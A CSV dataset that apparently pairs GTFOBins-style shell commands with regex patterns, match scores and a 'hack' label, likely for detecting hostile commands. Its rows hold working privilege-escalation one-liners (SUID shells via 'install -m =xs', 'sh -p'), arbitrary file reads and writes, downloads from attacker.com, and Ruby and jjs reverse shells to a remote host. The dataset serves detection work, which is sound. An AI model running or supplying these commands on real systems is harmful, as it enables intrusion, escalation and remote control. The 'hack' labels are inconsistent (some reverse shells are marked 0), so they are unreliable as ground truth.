ocode,code,word_count,match_count,match_score,hack
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e,"gimp -idf [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\; from os import environ as e",12,2,0.4943820224719101,0
if sys.version_info.major == 3: import urllib.request as r,"if sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r",8,1,0.423728813559322,0
else: import urllib as r,else: import urllib as r,5,0,0.0,0
"r.urlretrieve(e[""URL""], e[""LFILE""])'","r\.urlretrieve\(e""URL""\, e""LFILE""\)'",2,0,0.12121212121212122,0
"gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","gimp -idf [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""[\w\-_\/]+""\, ""wb""\)\.write\(""DATA""\)'",6,3,0.6304347826086957,0
"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","gimp -idf [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(open\(""[\w\-_\/]+""\)\.read\(\)\)'",5,3,0.6823529411764706,0
"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","gimp -idf [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\; cdll\.LoadLibrary\(""lib\.so""\)'",9,2,0.5980392156862745,0
sudo install -m =xs $(which gimp) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which gimp\) \.",7,1,0.75,0
"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","\./gimp -idf [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\; os\.execl\(""/bin/sh""\, ""sh""\, ""-p""\)'",9,2,0.5157894736842106,1
"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","sudo gimp -idf [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\; os\.system\(""sh""\)'",8,2,0.5609756097560976,0
"PAGER='sh -c ""exec sh 0<&1""' git -p help","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+[\'|""]| -e [\'|""]|cat >.*<<.*exec sh 0<&1""' git -p help",8,3,1.3414634146341464,1
git help config,git help config,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
git branch --help config,git branch --help config,4,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"git init ""$TF""","git init ""\$TF""",3,0,0.06666666666666667,0
"echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""","echo 'exec /bin/sh 0<&2 1>&2' >""\$TF/\.git/hooks/pre-commit\.sample""",6,0,0.045454545454545456,1
"mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""","mv ""\$TF/\.git/hooks/pre-commit\.sample"" ""\$TF/\.git/hooks/pre-commit""",3,0,0.07575757575757576,0
"git -C ""$TF"" commit --allow-empty -m x","git -C ""\$TF"" commit --allow-empty -m x",7,0,0.02564102564102564,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"ln -s /bin/sh ""$TF/git-x""","ln -s /bin/sh ""\$TF/git-x""",4,0,0.038461538461538464,1
"git ""--exec-path=$TF"" x","git ""[\w\-_]+=\$TF"" x",3,1,0.4583333333333333,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
git diff /dev/null $LFILE,git diff /dev/null \$LFILE,4,0,0.038461538461538464,0
"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help","sudo [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+[\'|""]| -e [\'|""]|cat >.*<<.*exec sh 0<&1""' git -p help",9,3,1.1956521739130435,1
sudo git -p help config,sudo git -p help config,5,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo git branch --help config,sudo git branch --help config,5,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"git init ""$TF""","git init ""\$TF""",3,0,0.06666666666666667,0
"echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""","echo 'exec /bin/sh 0<&2 1>&2' >""\$TF/\.git/hooks/pre-commit\.sample""",6,0,0.045454545454545456,1
"mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""","mv ""\$TF/\.git/hooks/pre-commit\.sample"" ""\$TF/\.git/hooks/pre-commit""",3,0,0.07575757575757576,0
"sudo git -C ""$TF"" commit --allow-empty -m x","sudo git -C ""\$TF"" commit --allow-empty -m x",8,0,0.022727272727272728,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"ln -s /bin/sh ""$TF/git-x""","ln -s /bin/sh ""\$TF/git-x""",4,0,0.038461538461538464,1
"sudo git ""--exec-path=$TF"" x","sudo git ""[\w\-_]+=\$TF"" x",4,1,0.3793103448275862,0
sudo install -m =xs $(which git) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which git\) \.",7,1,0.7714285714285715,0
"PAGER='sh -c ""exec sh 0<&1""' ./git -p help","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+[\'|""]| -e [\'|""]|cat >.*<<.*exec sh 0<&1""' \./git -p help",8,3,1.302325581395349,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
grep '' $LFILE,grep '' \$LFILE,3,0,0.06666666666666667,0
sudo install -m =xs $(which grep) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which grep\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./grep '' $LFILE,\./grep '' \$LFILE,3,0,0.11764705882352941,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo grep '' $LFILE,sudo grep '' \$LFILE,4,0,0.05,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
echo '#!/bin/sh' > $TF,echo '#!/bin/sh' > \$TF,4,0,0.043478260869565216,1
echo 'exec /bin/sh -p 0<&1' >> $TF,echo 'exec /bin/sh -p 0<&1' >> \$TF,7,0,0.02857142857142857,1
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
gtester -q $TF,gtester -q \$TF,3,0,0.06666666666666667,0
sudo install -m =xs $(which gtester) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which gtester\) \.",7,1,0.6923076923076923,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
echo '#!/bin/sh -p' > $TF,echo '#!/bin/sh -p' > \$TF,5,0,0.038461538461538464,1
echo 'exec /bin/sh -p 0<&1' >> $TF,echo 'exec /bin/sh -p 0<&1' >> \$TF,7,0,0.02857142857142857,1
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
sudo gtester -q $TF,sudo gtester -q \$TF,4,0,0.05,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
echo '#!/bin/sh' > $TF,echo '#!/bin/sh' > \$TF,4,0,0.043478260869565216,1
echo 'exec /bin/sh 0<&1' >> $TF,echo 'exec /bin/sh 0<&1' >> \$TF,6,0,0.03125,1
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
sudo gtester -q $TF,sudo gtester -q \$TF,4,0,0.05,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"hd ""$LFILE""","hd ""\$LFILE""",2,0,0.08333333333333333,0
sudo install -m =xs $(which hd) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which hd\) \.",7,1,0.7941176470588235,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./hd ""$LFILE""","\./hd ""\$LFILE""",2,0,0.14285714285714285,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo hd ""$LFILE""","sudo hd ""\$LFILE""",3,0,0.058823529411764705,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"head -c1G ""$LFILE""","head -c1G ""\$LFILE""",3,0,0.05263157894736842,0
sudo install -m =xs $(which head) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which head\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./head -c1G ""$LFILE""","\./head -c1G ""\$LFILE""",3,0,0.09523809523809523,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo head -c1G ""$LFILE""","sudo head -c1G ""\$LFILE""",4,0,0.041666666666666664,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"hexdump -C ""$LFILE""","hexdump -C ""\$LFILE""",3,0,0.05,0
sudo install -m =xs $(which hexdump) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which hexdump\) \.",7,1,0.6923076923076923,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./hexdump -C ""$LFILE""","\./hexdump -C ""\$LFILE""",3,0,0.09090909090909091,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo hexdump -C ""$LFILE""","sudo hexdump -C ""\$LFILE""",4,0,0.04,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"highlight --no-doc --failsafe ""$LFILE""","highlight --no-doc --failsafe ""\$LFILE""",4,0,0.02564102564102564,0
sudo install -m =xs $(which highlight) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which highlight\) \.",7,1,0.6585365853658537,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./highlight --no-doc --failsafe ""$LFILE""","\./highlight --no-doc --failsafe ""\$LFILE""",4,0,0.04878048780487805,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo highlight --no-doc --failsafe ""$LFILE""","sudo highlight --no-doc --failsafe ""\$LFILE""",5,0,0.022727272727272728,0
hping3,hping3,1,0,0.0,0
/bin/sh,/bin/sh,1,0,0.0,1
sudo install -m =xs $(which hping3) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which hping3\) \.",7,1,0.7105263157894737,0
./hping3,\./hping3,1,0,0.1111111111111111,0
/bin/sh -p,/bin/sh -p,2,0,0.0,1
sudo hping3,sudo hping3,2,0,0.0,0
/bin/sh,/bin/sh,1,0,0.0,1
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""","echo ""DATA"" \| iconv -f 8859_1 -t 8859_1 -o ""\$LFILE""",10,0,0.038461538461538464,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"iconv -f 8859_1 -t 8859_1 ""$LFILE""","iconv -f 8859_1 -t 8859_1 ""\$LFILE""",6,0,0.02857142857142857,0
sudo install -m =xs $(which iconv) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which iconv\) \.",7,1,0.7297297297297297,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./iconv -f 8859_1 -t 8859_1 ""$LFILE""","\./iconv -f 8859_1 -t 8859_1 ""\$LFILE""",6,0,0.05405405405405406,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./iconv -f 8859_1 -t 8859_1 ""$LFILE""","\./iconv -f 8859_1 -t 8859_1 ""\$LFILE""",6,0,0.05405405405405406,0
iftop,iftop,1,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo iftop,sudo iftop,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo install -m =xs $(which iftop) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which iftop\) \.",7,1,0.7297297297297297,0
./iftop,\./iftop,1,0,0.125,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo install -m =xs $(which install) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which install\) \.",7,1,0.6923076923076923,0
LFILE=file_to_change,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.4761904761904763,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
./install -m 6777 $LFILE $TF,\./install -m 6777 \$LFILE \$TF,5,0,0.10344827586206896,0
LFILE=file_to_change,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.4761904761904763,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
sudo install -m 6777 $LFILE $TF,sudo install -m 6777 \$LFILE \$TF,6,0,0.0625,0
ionice /bin/sh,ionice /bin/sh,2,0,0.0,1
sudo install -m =xs $(which ionice) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ionice\) \.",7,1,0.7105263157894737,0
./ionice /bin/sh -p,\./ionice /bin/sh -p,3,0,0.05,1
sudo ionice /bin/sh,sudo ionice /bin/sh,3,0,0.0,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"ip -force -batch ""$LFILE""","ip -force -batch ""\$LFILE""",4,0,0.038461538461538464,0
sudo install -m =xs $(which ip) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ip\) \.",7,1,0.7941176470588235,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./ip -force -batch ""$LFILE""","\./ip -force -batch ""\$LFILE""",4,0,0.07142857142857142,0
sudo install -m =xs $(which ip) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ip\) \.",7,1,0.7941176470588235,0
./ip netns add foo,\./ip netns add foo,4,0,0.05263157894736842,0
./ip netns exec foo /bin/sh -p,\./ip netns exec foo /bin/sh -p,6,0,0.03225806451612903,1
./ip netns delete foo,\./ip netns delete foo,4,0,0.045454545454545456,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo ip -force -batch ""$LFILE""","sudo ip -force -batch ""\$LFILE""",5,0,0.03225806451612903,0
sudo ip netns add foo,sudo ip netns add foo,5,0,0.0,0
sudo ip netns exec foo /bin/sh,sudo ip netns exec foo /bin/sh,6,0,0.0,1
sudo ip netns delete foo,sudo ip netns delete foo,5,0,0.0,0
irb,irb,1,0,0.0,0
exec '/bin/bash',exec '/bin/bash',2,0,0.0,1
export RHOST='127.0.0.1',"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.0\.0\.1'",2,2,1.32,0
export RPORT=9000,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.6666666666666667,0
irb,irb,1,0,0.0,0
"require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","require 'socket'\; exit if fork\;[\w\-_]+=TCPSocket\.new\(ENV""RHOST""\,ENV""RPORT""\)\;while\([\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.gets\)\;IO\.popen\(cmd\,""r""\){\|io\|c\.print io\.read} end",7,3,0.44274809160305345,0
irb,irb,1,0,0.0,0
"require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;","require 'webrick'\; WEBrick::HTTPServer\.new\(:Port => 8888\, :DocumentRoot => Dir\.pwd\)\.start\;",8,0,0.08791208791208792,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
irb,irb,1,0,0.0,0
"require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])","require 'open-uri'\; download =[ a-z0-9\.\-\/\'\""_\@]+\(ENV'URL'\)\; IO\.copy_stream\(download\, ENV'LFILE'\)",7,1,0.35714285714285715,0
irb,irb,1,0,0.0,0
"File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }","File\.open\(""[\w\-_\/]+""\, ""w\+""\) { \|f\| f\.write\(""DATA""\) }",6,1,0.38596491228070173,0
irb,irb,1,0,0.0,0
"puts File.read(""file_to_read"")","puts File\.read\(""[\w\-_\/]+""\)",2,1,0.45161290322580644,0
irb,irb,1,0,0.0,0
"require ""fiddle""; Fiddle.dlopen(""lib.so"")","require ""fiddle""\; Fiddle\.dlopen\(""lib\.so""\)",3,0,0.11904761904761904,0
sudo irb,sudo irb,2,0,0.0,0
exec '/bin/bash',exec '/bin/bash',2,0,0.0,1
"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c /$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs","echo ""Java\.type\('java\.lang\.Runtime'\)\.getRuntime\(\)\.exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)\.waitFor\(\)"" \| jjs",12,0,0.203125,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");","echo 'var [\w\-_]+=Java\.type\(""java\.lang\.System""\)\.getenv\(""RHOST""\)\;",3,1,0.27419354838709675,0
"var port=Java.type(""java.lang.System"").getenv(""RPORT"");","var [\w\-_]+=Java\.type\(""java\.lang\.System""\)\.getenv\(""RPORT""\)\;",2,1,0.30357142857142855,0
"var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");","var ProcessBuilder =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\(""java\.lang\.ProcessBuilder""\)\;",4,1,0.4666666666666667,0
"var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();","var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+ProcessBuilder\(""/bin/bash""\, ""-i""\)\.redirectErrorStream\(true\)\.start\(\)\;",4,2,0.5189873417721519,1
"var Socket = Java.type(""java.net.Socket"");","var Socket =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\(""java\.net\.Socket""\)\;",4,1,0.6511627906976745,0
"var s=new Socket(host,port);","var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+Socket\(host\,port\)\;",3,2,1.206896551724138,0
"var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();","var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getInputStream\(\)\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getErrorStream\(\)\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getInputStream\(\)\;",2,6,1.4788732394366197,0
"var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs","var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getOutputStream\(\)\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.getOutputStream\(\)\;while\(!s\.isClosed\(\)\){ while\(pi\.available\(\)>0\)so\.write\(pi\.read\(\)\)\; while\(pe\.available\(\)>0\)so\.write\(pe\.read\(\)\)\; while\(si\.available\(\)>0\)po\.write\(si\.read\(\)\)\; so\.flush\(\)\;po\.flush\(\)\; Java\.type\(""java\.lang\.Thread""\)\.sleep\(50\)\; try {p\.exitValue\(\)\;break\;}catch \(e\){}}\;p\.destroy\(\)\;s\.close\(\)\;' \| jjs",12,4,0.43026706231454004,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"echo ""var URL = Java.type('java.net.URL');","echo ""var URL =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\('java\.net\.URL'\)\;",5,1,0.6511627906976745,0
var ws = new URL('$URL');,"var ws =[ a-z0-9\.\-\/\'\""_\@]+URL\('\$URL'\)\;",5,1,1.0,0
var Channels = Java.type('java.nio.channels.Channels');,"var Channels =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\('java\.nio\.channels\.Channels'\)\;",4,1,0.5178571428571429,0
var rbc = Channels.newChannel(ws.openStream());,"var rbc =[ a-z0-9\.\-\/\'\""_\@]+Channels\.newChannel\(ws\.openStream\(\)\)\;",4,1,0.6041666666666666,0
var FileOutputStream = Java.type('java.io.FileOutputStream');,"var FileOutputStream =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\('java\.io\.FileOutputStream'\)\;",4,1,0.45161290322580644,0
var fos = new FileOutputStream('$LFILE');,"var fos =[ a-z0-9\.\-\/\'\""_\@]+FileOutputStream\('\$LFILE'\)\;",5,1,0.6190476190476191,0
"fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);","fos\.getChannel\(\)\.transferFrom\(rbc\, 0\, Number\.MAX_VALUE\)\;",3,0,0.17543859649122806,0
fos.close();,fos\.close\(\)\;,1,0,0.3076923076923077,0
"rbc.close();"" | jjs","rbc\.close\(\)\;"" \| jjs",3,0,0.25,0
"echo 'var FileWriter = Java.type(""java.io.FileWriter"");","echo 'var FileWriter =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\(""java\.io\.FileWriter""\)\;",5,1,0.5,0
"var fw=new FileWriter(""./file_to_write"");","var [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+FileWriter\(""\./[\w\-_\/]+""\)\;",3,3,1.0952380952380953,0
"fw.write(""DATA"");","fw\.write\(""DATA""\)\;",1,0,0.2222222222222222,0
fw.close();' | jjs,fw\.close\(\)\;' \| jjs,3,0,0.2631578947368421,0
"echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");","echo 'var BufferedReader =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\(""java\.io\.BufferedReader""\)\;",5,1,0.4375,0
"var FileReader = Java.type(""java.io.FileReader"");","var FileReader =[ a-z0-9\.\-\/\'\""_\@]+Java\.type\(""java\.io\.FileReader""\)\;",4,1,0.56,0
"var br = new BufferedReader(new FileReader(""file_to_read""));","var br =[ a-z0-9\.\-\/\'\""_\@]+BufferedReader\(new FileReader\(""[\w\-_\/]+""\)\)\;",6,2,0.6229508196721312,0
while ((line = br.readLine()) != null) { print(line); }' | jjs,"while \(\(line =[ a-z0-9\.\-\/\'\""_\@]+\.readLine\(\)\) !=[ a-z0-9\.\-\/\'\""_\@]+\) { print\(line\)\; }' \| jjs",11,2,0.873015873015873,0
sudo install -m =xs $(which jjs) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which jjs\) \.",7,1,0.7714285714285715,0
"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc /$@|sh/${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs","echo ""Java\.type\('java\.lang\.Runtime'\)\.getRuntime\(\)\.exec\('/bin/sh -pc /\$@\|sh/\${IFS}-p _ echo sh -p <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)\.waitFor\(\)"" \| \./jjs",13,0,0.1958041958041958,1
"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c /$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs","echo ""Java\.type\('java\.lang\.Runtime'\)\.getRuntime\(\)\.exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)\.waitFor\(\)"" \| sudo jjs",13,0,0.19548872180451127,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
join -a 2 /dev/null $LFILE,join -a 2 /dev/null \$LFILE,5,0,0.037037037037037035,0
sudo install -m =xs $(which join) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which join\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
join -a 2 /dev/null $LFILE,join -a 2 /dev/null \$LFILE,5,0,0.037037037037037035,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo join -a 2 /dev/null $LFILE,sudo join -a 2 /dev/null \$LFILE,6,0,0.03125,0
journalctl,journalctl,1,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo journalctl,sudo journalctl,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"jq -Rr . ""$LFILE""","jq -Rr \. ""\$LFILE""",4,0,0.1111111111111111,0
sudo install -m =xs $(which jq) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which jq\) \.",7,1,0.7941176470588235,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./jq -Rr . ""$LFILE""","\./jq -Rr \. ""\$LFILE""",4,0,0.15,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo jq -Rr . ""$LFILE""","sudo jq -Rr \. ""\$LFILE""",5,0,0.08695652173913043,0
